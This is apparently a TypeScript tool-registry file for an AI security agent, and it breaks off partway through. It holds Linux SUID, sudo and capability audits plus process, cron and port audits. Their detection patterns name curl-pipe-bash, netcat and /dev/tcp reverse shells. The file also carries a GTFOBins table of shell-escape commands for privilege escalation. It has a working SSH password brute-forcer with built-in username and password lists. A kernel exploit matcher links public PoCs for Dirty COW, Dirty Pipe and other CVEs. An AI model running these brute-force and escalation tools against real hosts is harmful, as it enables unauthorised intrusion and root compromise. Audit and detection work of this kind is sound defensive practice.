import { z } from "zod";
import * as fs from "fs";
import * as child_process from "child_process";
import { ToolRegistry } from "./registry";

function commandExists(cmd: string): boolean {
  try {
    child_process.execSync(`which ${cmd} 2>/dev/null`, {
      encoding: "utf-8",
      timeout: 5000,
    });
    return true;
  } catch {
    return false;
  }
}

function runCmd(cmd: string, timeoutMs = 30000): string {
  try {
    return child_process.execSync(cmd, {
      timeout: timeoutMs,
      maxBuffer: 10 * 1024 * 1024,
      encoding: "utf-8",
      stdio: "pipe",
    });
  } catch (err: any) {
    const stdout = err.stdout ? String(err.stdout) : "";
    const stderr = err.stderr ? String(err.stderr) : "";
    return stdout || stderr || err.message;
  }
}

function parseMatchLines(text: string, patterns: Array<{ regex: RegExp; label: string }>): string[] {
  const results: string[] = [];
  const lines = text.split("\n");
  for (const line of lines) {
    for (const p of patterns) {
      if (p.regex.test(line)) {
        results.push(`  [${p.label}] ${line.trim()}`);
        break;
      }
    }
  }
  return results;
}

function truncate(text: string, max: number): string {
  if (!text) return "";
  if (text.length <= max) return text;
  const half = Math.floor(max / 2);
  return text.slice(0, half) + `\n... [已截断，总 ${text.length} 字符] ...\n` + text.slice(-half);
}

export function createLinuxSecurityTools(): ToolRegistry {
  const registry = new ToolRegistry();

  const GTFObinsBins: Record<string, string> = {
    bash: "https://gtfobins.github.io/gtfobins/bash/ → SUID: ./bash -p",
    nmap: "https://gtfobins.github.io/gtfobins/nmap/ → --interactive + !sh",
    vim: "https://gtfobins.github.io/gtfobins/vim/ → :!sh 或 py3 调用",
    perl: "https://gtfobins.github.io/gtfobins/perl/ → exec('/bin/sh')",
    python: "https://gtfobins.github.io/gtfobins/python/ → import os; os.setuid(0); os.system('/bin/sh')",
    python3: "https://gtfobins.github.io/gtfobins/python3/ → 同上",
    awk: "https://gtfobins.github.io/gtfobins/awk/ → awk 'BEGIN {system(\"/bin/sh\")}'",
    find: "https://gtfobins.github.io/gtfobins/find/ → find / -exec /bin/sh \\; -quit",
    less: "https://gtfobins.github.io/gtfobins/less/ → !/bin/sh",
    more: "https://gtfobins.github.io/gtfobins/more/ → !/bin/sh",
    env: "https://gtfobins.github.io/gtfobins/env/ → env /bin/sh -p",
    mount: "https://gtfobins.github.io/gtfobins/mount/ → 挂载恶意 suid 镜像",
    su: "https://gtfobins.github.io/gtfobins/su/ → su root",
    chmod: "https://gtfobins.github.io/gtfobins/chmod/ → 改文件权限",
    tar: "https://gtfobins.github.io/gtfobins/tar/ → --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    zip: "https://gtfobins.github.io/gtfobins/zip/ → zip -T /tmp/x.zip --unzip-command=\"sh -c /bin/sh\"",
    node: "https://gtfobins.github.io/gtfobins/node/ → require('child_process').spawn('/bin/sh')",
    php: "https://gtfobins.github.io/gtfobins/php/ → php -r 'system(\"/bin/sh\");'",
    ruby: "https://gtfobins.github.io/gtfobins/ruby/ → exec '/bin/sh'",
    cp: "https://gtfobins.github.io/gtfobins/cp/ → 覆盖敏感文件写入恶意内容",
    curl: "https://gtfobins.github.io/gtfobins/curl/ → 上传读取 /etc/shadow",
    wget: "https://gtfobins.github.io/gtfobins/wget/ → 上传文件 / 拉取 payload",
    ping: "https://gtfobins.github.io/gtfobins/ping/ → 可读取任意文件（-f 等）",
    man: "https://gtfobins.github.io/gtfobins/man/ → !/bin/sh",
    tee: "https://gtfobins.github.io/gtfobins/tee/ → 写入任意文件提升权限",
    gdb: "https://gtfobins.github.io/gtfobins/gdb/ → !/bin/sh",
    screen: "https://gtfobins.github.io/gtfobins/screen/ → SUID root 后 screen -D -ms 执行命令",
    tmux: "https://gtfobins.github.io/gtfobins/tmux/ → 附着 root session",
    nano: "https://gtfobins.github.io/gtfobins/nano/ → ^R^X 执行命令",
    rsync: "https://gtfobins.github.io/gtfobins/rsync/ → -e 指定 payload 脚本",
    strace: "https://gtfobins.github.io/gtfobins/strace/ → -o /etc/shadow 写敏感文件",
  };

  registry.register({
    name: "suid_cap_audit",
    description: "Linux SUDO/SUID/Capability 提权面审计：扫描危险 SUID 二进制、sudoers NOPASSWD、高危 capabilities",
    parameters: z.object({
      mode: z
        .enum(["suid", "sudoers", "capability", "all"])
        .default("all")
        .describe("审计模式：suid=危险SUID, sudoers=sudo配置, capability=文件能力, all=全部"),
      path_scan: z.string().optional().default("/").describe("扫描根路径，默认 /"),
      skip_system: z.boolean().optional().default(true).describe("跳过系统默认路径噪声（/usr/sbin 等常见系统SUID）"),
    }),
    category: "linux",
    concurrent: true,
    execute: async (args: any) => {
      const { mode, path_scan = "/", skip_system = true } = args;
      const out: string[] = [`[SUID/Cap/Sudoers 审计] 根路径=${path_scan} 模式=${mode} skip_system=${skip_system}\n`];
      const modesToRun = mode === "all" ? ["suid", "sudoers", "capability"] : [mode];

      for (const m of modesToRun) {
        if (m === "suid") {
          out.push(`\n═══ SUID 二进制扫描 ═══`);
          try {
            const findCmd = `find '${path_scan}' -perm -4000 -type f -ls 2>/dev/null`;
            const raw = runCmd(findCmd, 60000);
            const lines = raw.split("\n").filter((l) => l.trim());
            const skipRe = /\/usr\/sbin\/|\/sbin\/|\/usr\/libexec\/|\/usr\/lib\/policykit-1\/|\/usr\/bin\/passwd|\/usr\/bin\/chsh|\/usr\/bin\/chfn|\/usr\/bin\/newgrp|\/usr\/bin\/gpasswd|\/usr\/bin\/mount|\/usr\/bin\/umount|\/usr\/bin\/su|\/usr\/bin\/sudo/;
            const filtered = skip_system ? lines.filter((l) => !skipRe.test(l)) : lines;
            const dangerous: string[] = [];
            const normal: string[] = [];
            for (const line of filtered) {
              const parts = line.split(/\s+/);
              const binPath = parts[parts.length - 1] || "";
              const baseName = binPath.split("/").pop() || "";
              if (GTFObinsBins[baseName]) {
                dangerous.push(`⚠️ [GTFOBins] ${binPath}\n   → ${GTFObinsBins[baseName]}`);
              } else {
                normal.push(`  • ${binPath}`);
              }
            }
            out.push(`扫描到 SUID 文件共 ${lines.length} 个，过滤后 ${filtered.length} 个`);
            if (dangerous.length) {
              out.push(`\n🚨 危险 SUID（可 GTFOBins 利用，${dangerous.length}）：\n` + dangerous.join("\n"));
            } else {
              out.push(`  ✓ 未发现 GTFOBins 高危 SUID 二进制`);
            }
            if (normal.length) {
              out.push(`\n📋 其他 SUID（${normal.length}，建议手动复核）：\n` + normal.slice(0, 80).join("\n") + (normal.length > 80 ? `\n... 共 ${normal.length} 个，仅显示前 80` : ""));
            }
          } catch (err: any) {
            out.push(`  ❌ 扫描失败: ${err.message}`);
          }
        }

        if (m === "sudoers") {
          out.push(`\n═══ sudo 与 sudoers 审计 ═══`);
          try {
            const sudol = runCmd("sudo -l 2>/dev/null", 10000);
            out.push(`── sudo -l 输出（当前用户可执行的 sudo 命令） ──\n${sudol || "(无输出或无法执行 sudo -l)"}`);
          } catch (err: any) {
            out.push(`  sudo -l 失败: ${err.message}`);
          }
          try {
            let sudoersContent = "";
            try {
              sudoersContent = fs.readFileSync("/etc/sudoers", "utf-8");
            } catch {
              try {
                sudoersContent = runCmd("cat /etc/sudoers 2>/dev/null", 5000);
              } catch {}
            }
            if (sudoersContent) {
              const noPassLines = sudoersContent
                .split("\n")
                .filter((l) => /NOPASSWD/i.test(l) && !l.trim().startsWith("#"));
              if (noPassLines.length) {
                out.push(`\n🚨 NOPASSWD 条目（无需密码即可 root 执行，${noPassLines.length}）：`);
                for (const nl of noPassLines) {
                  const baseName = (nl.match(/\b([a-zA-Z0-9_.\-]+)(?:\s|$)/g) || [])
                    .map((w) => w.trim())
                    .filter((w) => GTFObinsBins[w])[0];
                  out.push(
                    "  " + nl.trim() +
                    (baseName ? `\n    ⚠️ 包含可利用命令 ${baseName}: ${GTFObinsBins[baseName]}` : "")
                  );
                }
              } else {
                out.push(`\n  ✓ /etc/sudoers 中未发现 NOPASSWD 条目`);
              }
              const setenvLines = sudoersContent
                .split("\n")
                .filter((l) => /SETENV/i.test(l) && !l.trim().startsWith("#"));
              if (setenvLines.length) {
                out.push(`\n⚠️ SETENV 条目（可控制 LD_PRELOAD 等环境变量提权，${setenvLines.length}）：\n` + setenvLines.map((l) => "  " + l.trim()).join("\n"));
              }
            }
          } catch (err: any) {
            out.push(`  /etc/sudoers 读取失败: ${err.message}`);
          }
        }

        if (m === "capability") {
          out.push(`\n═══ 文件能力 (capabilities) 审计 ═══`);
          if (!commandExists("getcap")) {
            out.push(`  ⚠️ getcap 命令未安装，建议安装 libcap2-bin：apt install libcap2-bin`);
          } else {
            try {
              const raw = runCmd(`getcap -r '${path_scan}' 2>/dev/null`, 60000);
              const dangerousCaps = [
                { cap: "cap_setuid+ep", desc: "可调用 setuid(0) 直接切换 root" },
                { cap: "cap_sys_admin+ep", desc: "近似 root，可挂载/mknod/ptrace等大量危险操作" },
                { cap: "cap_sys_ptrace+ep", desc: "可 ptrace 注入 root 进程内存/RIP" },
                { cap: "cap_dac_read_search+ep", desc: "可绕过 DAC 读取任意文件（含 /etc/shadow）" },
                { cap: "cap_dac_override+ep", desc: "可绕过 DAC 读写执行任意文件" },
                { cap: "cap_fowner+ep", desc: "可改变任意文件属主/权限" },
                { cap: "cap_net_raw+eip", desc: "可抓包/伪造 raw socket（内网嗅探+ARP欺骗）" },
                { cap: "cap_net_admin+ep", desc: "可改路由、抓包、改网络命名空间" },
                { cap: "cap_sys_module+ep", desc: "可加载/卸载内核模块（任意内核代码执行）" },
              ];
              const lines = raw.split("\n").filter((l) => l.trim());
              out.push(`扫描到 capability 文件共 ${lines.length} 个`);
              const hits: string[] = [];
              for (const line of lines) {
                for (const dc of dangerousCaps) {
                  if (line.includes(dc.cap)) {
                    hits.push(`🚨 ${line.trim()}\n    → ${dc.desc}`);
                    break;
                  }
                }
              }
              if (hits.length) {
                out.push(`\n🚨 高危 capability（${hits.length}）：\n` + hits.join("\n"));
              } else {
                out.push(`  ✓ 未发现高危 capability`);
              }
              if (lines.length) {
                out.push(`\n📋 完整列表（前 80）：\n` + lines.slice(0, 80).join("\n") + (lines.length > 80 ? `\n... 共 ${lines.length} 个` : ""));
              }
            } catch (err: any) {
              out.push(`  ❌ getcap 失败: ${err.message}`);
            }
          }
        }
      }

      return out.join("\n");
    },
  });

  registry.register({
    name: "process_service_audit",
    description: "Linux 进程/服务/Cron/监听端口审计：挖矿木马标记、可疑 crontab、异常端口",
    parameters: z.object({
      mode: z
        .enum(["process", "service", "cron", "listening", "all"])
        .default("all")
        .describe("审计模式：process=进程, service=服务, cron=计划任务, listening=监听端口, all=全部"),
    }),
    category: "linux",
    concurrent: true,
    execute: async (args: any) => {
      const { mode } = args;
      const out: string[] = [`[进程/服务/Cron/端口审计] 模式=${mode}\n`];
      const modesToRun = mode === "all" ? ["process", "service", "cron", "listening"] : [mode];

      for (const m of modesToRun) {
        if (m === "process") {
          out.push(`\n═══ 进程审计（按内存排序前100） ═══`);
          try {
            const ps = runCmd("ps auxfw --sort=-%mem 2>/dev/null | head -n 100", 10000);
            const suspPatterns = [
              { regex: /xmrig|minerd|kworkerds|sysupdate|cpuminer|optineer|stratum/i, label: "挖矿进程" },
              { regex: /curl\s+.*\|\s*bash|wget\s+-qO-\s+.*\|\s*bash|bash\s+<\(curl/i, label: "curl|bash 一键执行" },
              { regex: /nc\s+-e|nc\s+-c|netcat\s+-e|socat\s+.*exec:/i, label: "nc reverse shell" },
              { regex: /python.*reverse|python.*socket\.connect|perl.*reverse|php.*reverse/i, label: "脚本 reverse shell" },
              { regex: /cryptonight|monero|stratum\+tcp|pool\./i, label: "矿池/算法特征" },
              { regex: /\.hidden|\/tmp\/\.|\/dev\/shm\/|\/var\/tmp\//i, label: "可疑路径" },
              { regex: /bash\s+-i\s+>&|\/dev\/tcp\/|socket\.socket.*connect/i, label: "反弹 shell 特征" },
            ];
            const matches = parseMatchLines(ps, suspPatterns);
            if (matches.length) {
              out.push(`🚨 可疑进程（${matches.length}）：\n` + matches.join("\n"));
            } else {
              out.push(`  ✓ 未发现明确恶意进程特征`);
            }
            out.push(`\n── 进程清单（前 100） ──\n${ps || "(无输出)"}`);
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }

        if (m === "service") {
          out.push(`\n═══ 服务审计 ═══`);
          try {
            if (commandExists("systemctl")) {
              const svc = runCmd("systemctl list-units --type=service --state=running 2>/dev/null | head -n 200", 10000);
              out.push(`── systemctl running services ──\n${svc || "(无)"}`);
              try {
                const failed = runCmd("systemctl --failed 2>/dev/null | head -n 60", 5000);
                if (failed.trim()) out.push(`\n⚠️ failed units:\n${failed}`);
              } catch {}
            } else if (commandExists("service")) {
              const svc = runCmd("service --status-all 2>/dev/null | head -n 200", 10000);
              out.push(`── service --status-all ──\n${svc || "(无)"}`);
            } else {
              out.push(`  ⚠️ 未发现 systemctl/service，尝试 init.d 列表`);
              try {
                const initd = runCmd("ls -la /etc/init.d/ 2>/dev/null", 5000);
                out.push(initd);
              } catch {}
            }
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }

        if (m === "cron") {
          out.push(`\n═══ 计划任务 (Cron) 审计 ═══`);
          try {
            const cronCmd = `
for f in /etc/crontab /var/spool/cron/* /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/*; do
  if [ -f "$f" ]; then echo "== $f =="; cat "$f" 2>/dev/null; echo; fi
done
echo "== 当前用户 crontab -l =="
crontab -l 2>/dev/null
echo "== /etc/cron* 目录列表 =="
ls -la /etc/cron* 2>/dev/null
`;
            const raw = runCmd(cronCmd, 15000);
            const suspPatterns = [
              { regex: /curl\s+.*\|\s*bash|wget\s+-qO-\s+.*\|\s*bash/i, label: "curl|bash 下载执行" },
              { regex: /\|\s*bash|\|\s*sh|bash\s+-c\s+["'].*http/i, label: "管道到 shell" },
              { regex: /\bnc\b|netcat|socat.*exec/i, label: "nc/socat 反向" },
              { regex: /reverse.*shell|python.*socket|perl.*socket|php.*exec/i, label: "反弹 shell" },
              { regex: /\/tmp\/|\/dev\/shm\/|\/var\/tmp\//i, label: "可疑路径执行" },
              { regex: /base64\s+-d|decode/i, label: "编码 payload" },
            ];
            const matches = parseMatchLines(raw, suspPatterns);
            if (matches.length) {
              out.push(`🚨 可疑 cron 条目（${matches.length}）：\n` + matches.join("\n"));
            } else {
              out.push(`  ✓ 未发现明显恶意 cron`);
            }
            out.push(`\n── 完整 cron 输出（截断 8000 字符）──\n${truncate(raw, 8000)}`);
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }

        if (m === "listening") {
          out.push(`\n═══ 监听端口审计 ═══`);
          try {
            const raw = commandExists("ss")
              ? runCmd("ss -tulnp 2>/dev/null", 5000)
              : runCmd("netstat -tulnp 2>/dev/null", 5000);
            const suspPorts: Record<string, string> = {
              "4444": "Metasploit 常见 reverse",
              "5555": "Android adb / shell 常用",
              "6666": "IRC / 后门常用",
              "7777": "后门 / miner",
              "8888": "常见代理 / miner",
              "9999": "后门 / miner",
              "31337": "Leet / 后门",
              "12345": "NetBus / 后门",
              "54321": "Back Orifice",
              "1337": "常见 CTF / 后门",
            };
            const portRe = /:(\d{2,5})\s/;
            const lines = raw.split("\n").filter((l) => l.trim());
            const warns: string[] = [];
            for (const line of lines) {
              const m = line.match(portRe);
              if (m && suspPorts[m[1]]) {
                warns.push(`  ⚠️ 端口 ${m[1]} (${suspPorts[m[1]]}) → ${line.trim()}`);
              }
            }
            if (warns.length) out.push(`🚨 非标准/后门知名端口（${warns.length}）：\n` + warns.join("\n"));
            out.push(`\n── 监听端口完整 ──\n${raw || "(无)"}`);
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }
      }

      return out.join("\n");
    },
  });

  registry.register({
    name: "ssh_crack",
    description: "SSH 弱口令爆破：内置常用弱密码+用户名字典，支持 sshpass/expect/paramiko 三级回退。仅对授权目标使用。",
    parameters: z.object({
      host: z.string().describe("目标 SSH 主机 IP / 域名"),
      port: z.number().optional().default(22).describe("SSH 端口，默认 22"),
      username: z.string().optional().describe("单用户名爆破（与 username_list 二选一，优先单用户）"),
      username_list: z.string().optional().describe("用户名字典文件路径（每行一个），不提供则用内置列表"),
      password_list: z.string().optional().describe("密码字典文件路径（每行一个），不提供则用内置列表"),
      max_attempts: z.number().min(10).max(2000).optional().default(200).describe("最大尝试次数 10-2000，默认 200"),
      timeout_ms: z.number().optional().default(3000).describe("单次连接超时毫秒，默认 3000"),
    }),
    category: "linux",
    requirePermission: true,
    execute: async (args: any) => {
      const { host, port = 22, username, username_list, password_list, max_attempts = 200, timeout_ms = 3000 } = args;
      const out: string[] = [`[SSH 弱口令爆破] ${host}:${port}\n最大尝试: ${max_attempts} 单用户: ${username || "(未指定)"} 超时: ${timeout_ms}ms\n`];

      const builtinUsers = ["root", "admin", "test", "user", "ubuntu", "centos", "deploy", "git", "kali", "pi"];
      const builtinPasswords = [
        "root", "toor", "admin", "123456", "password", "12345678", "qwerty",
        "letmein", "welcome", "admin123", "root123", "test123", "user123",
        "ubuntu", "centos", "kali", "raspberry", "1q2w3e4r", "P@ssw0rd", "changeme",
      ];

      let users: string[] = [];
      if (username) users = [username];
      else if (username_list) {
        try {
          users = fs.readFileSync(username_list, "utf-8").split("\n").map((l) => l.trim()).filter(Boolean);
        } catch (err: any) {
          out.push(`❌ 读取 username_list 失败: ${err.message}`);
          return out.join("\n");
        }
      } else users = builtinUsers.slice();

      let passwords: string[] = [];
      if (password_list) {
        try {
          passwords = fs.readFileSync(password_list, "utf-8").split("\n").map((l) => l.trim()).filter(Boolean);
        } catch (err: any) {
          out.push(`❌ 读取 password_list 失败: ${err.message}`);
          return out.join("\n");
        }
      } else passwords = builtinPasswords.slice();

      const attemptsLimit = Math.max(10, Math.min(2000, Number(max_attempts) || 200));
      const combos: Array<[string, string]> = [];
      outer:
      for (const u of users) {
        for (const p of passwords) {
          if (combos.length >= attemptsLimit) break outer;
          combos.push([u, p]);
        }
      }
      out.push(`用户数: ${users.length}  密码数: ${passwords.length}  实际组合: ${combos.length}\n`);

      const startTime = Date.now();
      let successCreds: Array<{ user: string; pass: string }> = [];
      let failedCount = 0;

      const connectViaSshpass = async (u: string, p: string): Promise<boolean> => {
        try {
          const cmd = `sshpass -p '${p.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=${Math.ceil(timeout_ms / 1000)} -o BatchMode=no -p ${port} ${u}@${host} 'echo AUTH_OK_$$' 2>&1`;
          const out2 = runCmd(cmd, timeout_ms + 2000);
          return /AUTH_OK_/.test(out2);
        } catch {
          return false;
        }
      };

      const connectViaExpect = async (u: string, p: string): Promise<boolean> => {
        const script = `#!/usr/bin/env bash
/usr/bin/env expect <<'EOF'
set timeout ${Math.ceil((timeout_ms + 1000) / 1000)}
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p ${port} ${u}@${host} "echo AUTH_OK_\\\$\\\$"
expect {
  "*yes/no*" { send "yes\\r"; exp_continue }
  "*assword:*" { send '${p.replace(/'/g, "\\'")}\\r' }
  timeout { exit 2 }
  eof { exit 3 }
}
expect {
  "AUTH_OK_" { exit 0 }
  "*assword:*" { exit 1 }
  timeout { exit 2 }
  eof { catch wait result; exit [lindex \\$result 3] }
}
EOF
exit $?
`;
        try {
          const tmpFile = `/tmp/ssh_expect_${process.pid}_${Date.now()}.sh`;
          fs.writeFileSync(tmpFile, script, { mode: 0o700 });
          const res = runCmd(`bash '${tmpFile}' 2>&1`, timeout_ms + 3000);
          try { fs.unlinkSync(tmpFile); } catch {}
          return /AUTH_OK_/.test(res);
        } catch {
          return false;
        }
      };

      const connectViaParamiko = async (u: string, p: string): Promise<boolean> => {
        const py = `
import sys, socket
try:
  import paramiko
except Exception as e:
  print('PARAMIKO_MISSING:', e)
  sys.exit(2)
try:
  c = paramiko.SSHClient()
  c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  c.connect('${host.replace(/'/g, "")}', port=${port}, username='${u.replace(/'/g, "")}', password='${p.replace(/'/g, "")}', timeout=${timeout_ms / 1000}, banner_timeout=10, auth_timeout=10, allow_agent=False, look_for_keys=False)
  stdin, stdout, stderr = c.exec_command('echo AUTH_OK_X')
  out = (stdout.read() + stderr.read()).decode('utf-8', 'ignore')
  c.close()
  if 'AUTH_OK_X' in out:
    print('AUTH_OK')
    sys.exit(0)
  else:
    sys.exit(1)
except paramiko.AuthenticationException:
  sys.exit(1)
except Exception as e:
  print('ERR:', type(e).__name__, str(e)[:120])
  sys.exit(3)
`.trim();
        try {
          const tmp = `/tmp/ssh_paramiko_${process.pid}_${Date.now()}.py`;
          fs.writeFileSync(tmp, py);
          const res = runCmd(`python3 '${tmp}' 2>&1`, timeout_ms + 5000);
          try { fs.unlinkSync(tmp); } catch {}
          if (/PARAMIKO_MISSING/.test(res)) return false;
          return /AUTH_OK/.test(res);
        } catch {
          return false;
        }
      };

      let method: string;
      let methodFn: (u: string, p: string) => Promise<boolean>;
      if (commandExists("sshpass") && commandExists("ssh")) {
        method = "sshpass + ssh";
        methodFn = connectViaSshpass;
      } else if (commandExists("expect") && commandExists("ssh")) {
        method = "expect heredoc + ssh";
        methodFn = connectViaExpect;
      } else {
        method = "python3 paramiko";
        methodFn = connectViaParamiko;
      }
      out.push(`爆破方式: ${method}\n`);

      for (let i = 0; i < combos.length; i++) {
        const [u, p] = combos[i];
        try {
          const ok = await methodFn(u, p);
          if (ok) {
            successCreds.push({ user: u, pass: p });
            out.push(`✅ 成功 [${i + 1}/${combos.length}]  ${u}:${p}`);
          } else {
            failedCount++;
          }
        } catch {
          failedCount++;
        }
        if ((i + 1) % 20 === 0) {
          out.push(`  …进度 ${i + 1}/${combos.length}  成功 ${successCreds.length}  失败 ${failedCount}`);
        }
      }

      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
      out.push(`\n━━━━ 爆破结束 ━━━━\n用时: ${elapsed}s\n成功凭据数: ${successCreds.length}\n失败次数: ${failedCount}\n速率: ${((combos.length / Math.max(0.01, Number(elapsed))).toFixed(2))} 次/s`);
      if (successCreds.length) {
        out.push(`\n🚨 有效凭据：\n` + successCreds.map((c) => `  ${c.user}:${c.pass}`).join("\n"));
      } else {
        out.push(`\n未爆破出有效凭据。可尝试：扩充字典、增大 max_attempts（上限 2000）、降低 timeout_ms 以提速。`);
      }
      return out.join("\n");
    },
  });

  registry.register({
    name: "kernel_exploit_match",
    description: "Linux 内核提权 exploit 匹配：自动探测内核/发行版，匹配已知内核漏洞（Dirty COW、Dirty Pipe、nf_tables 等）并给出严重级别 + PoC 链接",
    parameters: z.object({
      kernel_version: z.string().optional().describe("手动指定内核版本（如 5.4.0-91-generic），不填则自动探测 uname -r"),
      distro: z.string().optional().describe("手动指定发行版（ubuntu/debian/centos/rhel），不填则自动读取 /etc/os-release"),
    }),
    category: "linux",
    concurrent: true,
    execute: async (args: any) => {
      const { kernel_version, distro } = args;
      const out: string[] = [`[内核 exploit 匹配]\n`];

      let probe = "";
      let kver = kernel_version || "";
      let osName = distro || "";
      try {
        probe = runCmd("uname -rms; echo '---OS-RELEASE---'; cat /etc/os-release /etc/issue 2>/dev/null", 5000);
        out.push(`── 自动探测信息 ──\n${probe}`);
        if (!kver) {
          const m = probe.match(/^(\S+)/m);
          if (m) kver = m[1];
        }
        if (!osName) {
          const m1 = probe.match(/PRETTY_NAME="?([^"\n]+)"?/i);
          if (m1) osName = m1[1];
          else {
            const m2 = probe.match(/^ID="?(\w+)"?/im);
            if (m2) osName = m2[1];
          }
        }
      } catch (err: any) {
        out.push(`  自动探测失败: ${err.message}`);
      }
      if (!kver) {
        out.push(`❌ 无法获取内核版本，手动传入 kernel_version 参数`);
        return out.join("\n");
      }
      out.push(`\n解析内核版本: ${kver}   发行版: ${osName || "(未知)"}\n`);

      const coreMatch = kver.match(/^(\d+)\.(\d+)(?:\.(\d+))?/);
      if (!coreMatch) {
        out.push(`❌ 无法解析内核主版本: ${kver}`);
        return out.join("\n");
      }
      const kmaj = Number(coreMatch[1]);
      const kmin = Number(coreMatch[2]);
      const kpatch = coreMatch[3] != null ? Number(coreMatch[3]) : 0;

      const cmpKernel = (majMin: [number, number], patchMax: number | null = null): { lt?: boolean; inRange?: boolean } => {
        const [a, b] = majMin;
        if (kmaj < a) return { lt: true };
        if (kmaj > a) return { lt: false };
        if (kmin < b) return { lt: true };
        if (kmin > b) return { lt: false };
        if (patchMax == null) return { inRange: true };
        return { inRange: kpatch <= patchMax };
      };

      const inRangeInclusive = (low: [number, number, number], high: [number, number, number]): boolean => {
        const cur = [kmaj, kmin, kpatch];
        for (let i = 0; i < 3; i++) {
          if (cur[i] < low[i]) return false;
          if (cur[i] > low[i]) break;
        }
        for (let i = 0; i < 3; i++) {
          if (cur[i] > high[i]) return false;
          if (cur[i] < high[i]) break;
        }
        return true;
      };

      type Exploit = {
        cve: string;
        name: string;
        range: string;
        severity: "CRITICAL" | "HIGH" | "MEDIUM";
        description: string;
        poc: string;
        match: () => boolean;
      };

      const exploits: Exploit[] = [
        {
          cve: "CVE-2016-5195",
          name: "Dirty COW (Copy-On-Write)",
          range: "< 4.8.3",
          severity: "CRITICAL",
          description: "竞态条件导致私有映射可写，任意文件覆写；通用性极强，经典本地 root。",
          poc: "https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs",
          match: () => inRangeInclusive([0, 0, 0], [4, 8, 2]) || (kmaj === 4 && kmin === 8 && kpatch < 3),
        },
        {
          cve: "CVE-2022-0847",
          name: "Dirty Pipe",
          range: "5.8 - 5.16.11",
          severity: "CRITICAL",
          description: "pipe 与页缓存混用导致任意只读文件覆写（含 suid / 容器内可打宿主）。",
          poc: "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
          match: () => {
            if (kmaj < 5) return false;
            if (kmaj === 5 && kmin < 8) return false;
            if (kmaj > 5) return false;
            if (kmaj === 5 && kmin > 16) return false;
            if (kmaj === 5 && kmin === 16 && kpatch > 11) return false;
            return true;
          },
        },
        {
          cve: "CVE-2024-1086",
          name: "netfilter nf_tables 双重释放",
          range: "5.14 - 6.6",
          severity: "CRITICAL",
          description: "nf_tables 表达式错误路径 UAF，本地用户 root 提权；容器 user namespace 默认开启环境极易触发。",
          poc: "https://github.com/Notselwyn/CVE-2024-1086",
          match: () => {
            if (kmaj < 5) return false;
            if (kmaj === 5 && kmin < 14) return false;
            if (kmaj > 6) return false;
            if (kmaj === 6 && kmin > 6) return false;
            return true;
          },
        },
        {
          cve: "CVE-2023-0386",
          name: "overlayfs 权限提升",
          range: "5.4 - 6.2",
          severity: "HIGH",
          description: "overlayfs 拷贝 up 时未正确校验 user namespace，可将普通文件变为 suid root。",
          poc: "https://github.com/chenaotian/CVE-2023-0386",
          match: () => {
            if (kmaj < 5) return false;
            if (kmaj === 5 && kmin < 4) return false;
            if (kmaj > 6) return false;
            if (kmaj === 6 && kmin > 2) return false;
            return true;
          },
        },
        {
          cve: "CVE-2021-3490",
          name: "eBPF verifier + overlayfs 提权",
          range: "5.8 - 5.11",
          severity: "HIGH",
          description: "eBPF 验证器越界错误 + overlayfs 组合导致本地 root。Ubuntu 20.10/21.04 默认受影响。",
          poc: "https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490",
          match: () => kmaj === 5 && kmin >= 8 && kmin <= 11,
        },
        {
          cve: "CVE-2017-16995",
          name: "eBPF verifier 32位 ALU 越界",
          range: "< 4.14-rc1",
          severity: "HIGH",
          description: "eBPF 32位 ALU 运算未正确截断，可任意读写内核内存；本地 root。",
          poc: "https://github.com/3xocyte/cve-2017-16995",
          match: () => {
            if (kmaj < 4) return true;
            if (kmaj === 4 && kmin < 14) return true;
            return false;
          },
        },
        {
          cve: "CVE-2019-13272",
          name: "PTRACE_TRACEME + creds 竞争",
          range: "4.10 - 5.2",
          severity: "HIGH",
          description: "ptrace 子进程继承父进程 creds 的竞态，结合 pkexec/su 可本地 root。",
          poc: "https://github.com/jiayy/android_vuln_poc/tree/master/CVE-2019-13272",
          match: () => {
            if (kmaj < 4) return false;
            if (kmaj === 4 && kmin < 10) return false;
            if (kmaj > 5) return false;
            if (kmaj === 5 && kmin > 2) return false;
            return true;
          },
        },
        {
          cve: "CVE-2022-0492",
          name: "cgroups v1 release_agent 容器逃逸",
          range: "内核支持 cgroup v1 环境",
          severity: "HIGH",
          description: "cgroup v1 release_agent 未校验 cgroup namespace + user namespace，容器内可触发宿主执行任意命令。",
          poc: "https://github.com/Yu3xSec/CVE-2022-0492",
          match: () => {
            const cgroupV1 = fs.existsSync("/sys/fs/cgroup/cpu") || fs.existsSync("/sys/fs/cgroup/memory");
            if (kmaj < 4) return false;
            return cgroupV1;
          },
        },
        {
          cve: "CVE-2022-27666",
          name: "IPsec esp6 缓冲区溢出",
          range: "< 5.17-rc1 (主要 5.x)",
          severity: "HIGH",
          description: "IPv6 ESP xfrm 解析时 skb_page_frag_refill 溢出，可本地 root；需加载 af_key 或 xfrm 用户可用。",
          poc: "https://github.com/plummm/CVE-2022-27666",
          match: () => {
            if (kmaj < 5) return false;
            if (kmaj > 5) return false;
            if (kmaj === 5 && kmin < 1) return false;
            if (kmaj === 5 && kmin >= 17) return false;
            return true;
          },
        },
        {
          cve: "CVE-2023-32233",
          name: "netfilter nf_tables UAF",
          range: "<= 6.3 (主要 5.13+)",
          severity: "HIGH",
          description: "nf_tables batch 匿名 set 处理 UAF，可本地用户利用提权 root；容器 user ns 默认可打。",
          poc: "https://github.com/Liuk3r/CVE-2023-32233",
          match: () => {
            if (kmaj < 5) return false;
            if (kmaj === 5 && kmin < 13) return false;
            if (kmaj > 6) return false;
            if (kmaj === 6 && kmin > 3) return false;
            return true;
          },
        },
      ];

